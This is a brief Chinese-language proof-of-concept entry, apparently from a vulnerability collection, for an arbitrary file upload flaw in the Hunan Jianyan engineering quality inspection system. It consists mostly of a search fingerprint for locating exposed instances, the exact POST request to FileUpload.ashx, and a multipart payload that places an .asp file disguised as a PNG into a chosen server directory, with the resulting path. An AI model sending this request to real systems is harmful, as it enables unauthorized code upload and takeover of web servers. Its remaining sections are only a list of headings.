# 湖南建研工程质量检测系统FileUpload存在任意文件上传漏洞

- **系统**：湖南建研工程质量检测系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Platform/System/FileUpload.ashx HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 336`　`Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6…`

**请求体 / payload**
```
------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="file"; filename="YsOxWxSvj1KyZow1PTsh98fdu63.asp"
Content-Type: image/png
123
------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="target"
/Applications/SkillDevelopAndEHS/
------YsOxWxSvj1KyZow1PTsh98fdu6l--

上传文件位置
/Applications/SkillDevelopAndEHS/YsOxWxSvj1KyZow1PTsh98fdu63.asp
```

**其他**
- 湖南建研工程质量检测系统FileUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 湖南建研工程质量检测系统